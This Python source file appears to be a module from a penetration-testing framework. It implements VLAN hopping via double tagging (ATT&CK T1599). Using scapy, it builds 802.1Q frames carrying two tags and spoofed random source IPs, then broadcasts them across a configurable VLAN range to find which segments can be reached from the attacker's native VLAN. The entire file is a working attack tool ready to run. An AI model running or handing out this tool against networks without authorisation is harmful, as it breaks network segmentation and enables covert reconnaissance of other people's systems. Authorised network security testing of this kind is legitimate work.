"""
VLAN Hopping via Double Tagging — T1599

Scans multiple VLANs by injecting double-tagged frames to discover which VLANs
are reachable from the native VLAN. Unlike dvlan (single target VLAN), this module
iterates over a VLAN range for blind topology mapping.
"""
import random

from scapy.all import Dot1Q, Ether, ICMP, IP, sendp

NAME = "vlan"
DESCRIPTION = "VLAN scan — probe all VLANs via double-tag injection"
ATTCK_ID = "T1599"


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    vlan_list = _parse_vlans(args.vlans)
    logger.info(
        "START | technique=%s | iface=%s | vlans=%d | pkt_per_vlan=%d | target=%s",
        ATTCK_ID, args.interface, len(vlan_list), args.count, args.target_ip,
    )
    ok = _execute(args, logger, vlan_list)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--vlans",
                   default="1-100,200,300,400,500,1000,2000",
                   help="VLAN IDs: comma-separated, range support (1-100,200,300). "
                        "Default: 1-100 + common VLANs")
    p.add_argument("--native-vlan", type=int, default=1,
                   help="Native VLAN of attacker port (outer tag, default 1)")
    p.add_argument("--target-ip",  "-ti", default="192.168.1.1")
    p.add_argument("--count", "-c", type=int, default=1,
                   help="Packets per VLAN (default 1 for fast scan)")
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _parse_vlans(spec: str):
    vlans = []
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            start, end = part.split("-", 1)
            vlans.extend(range(int(start), int(end) + 1))
        else:
            vlans.append(int(part))
    return sorted(set(vlans))


def _execute(args, logger=None, vlan_list=None):
    _log = logger.info if logger else print
    if vlan_list is None:
        vlan_list = _parse_vlans(args.vlans)

    native = args.native_vlan
    pkts = []
    for vlan in vlan_list:
        if vlan == native:
            continue        # skip — outer = inner = native → no hopping
        for _ in range(args.count):
            pkt = (
                Ether(dst="ff:ff:ff:ff:ff:ff") /
                Dot1Q(vlan=native) /
                Dot1Q(vlan=vlan) /
                IP(dst=args.target_ip,
                   src=f"192.168.{random.randint(1,254)}.{random.randint(1,254)}") /
                ICMP() / b"NETSTRIKE_VLAN_SCAN"
            )
            pkts.append(pkt)

    _log(f"[VLAN] Scanning {len(vlan_list)} VLANs → {len(pkts)} packets")
    try:
        sendp(pkts, iface=args.interface, verbose=args.verbose)
        _log(f"[VLAN] Done — capture on target segment to confirm which VLANs are reachable")
        return True
    except Exception as e:
        _log(f"[VLAN] Error: {e}")
        return False
